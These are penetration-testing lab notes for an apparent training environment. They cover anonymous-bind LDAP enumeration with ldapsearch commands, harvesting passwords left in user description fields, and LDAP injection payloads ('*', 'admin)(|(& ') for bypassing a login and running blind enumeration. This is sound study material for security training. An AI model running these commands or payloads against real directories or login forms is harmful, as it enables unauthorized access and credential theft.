# LDAP Labs

> Cross-reference: [[ldap-methodology]]

---

## Lab 1: Anonymous Bind — LDAP Enumeration

- [ ] Test anonymous access:
```bash
ldapsearch -x -H ldap://TARGET -s base namingcontexts
```
- [ ] Dump directory:
```bash
ldapsearch -x -H ldap://TARGET -b "DC=inlanefreight,DC=local"
```
- [ ] Extract users with descriptions:
```bash
ldapsearch -x -H ldap://TARGET -b "DC=inlanefreight,DC=local" \
  "(objectClass=user)" sAMAccountName description | grep -A1 "sAMAccountName\|description"
```
- [ ] Look for passwords in description fields → use to pivot

---

## Lab 2: LDAP Injection — Authentication Bypass

- [ ] Identify LDAP-backed login form
- [ ] Test injection in username field: `*`
- [ ] Test: `admin)(|(& ` with any password
- [ ] If login succeeds → LDAP injection confirmed
- [ ] Enumerate via blind injection (character-by-character)
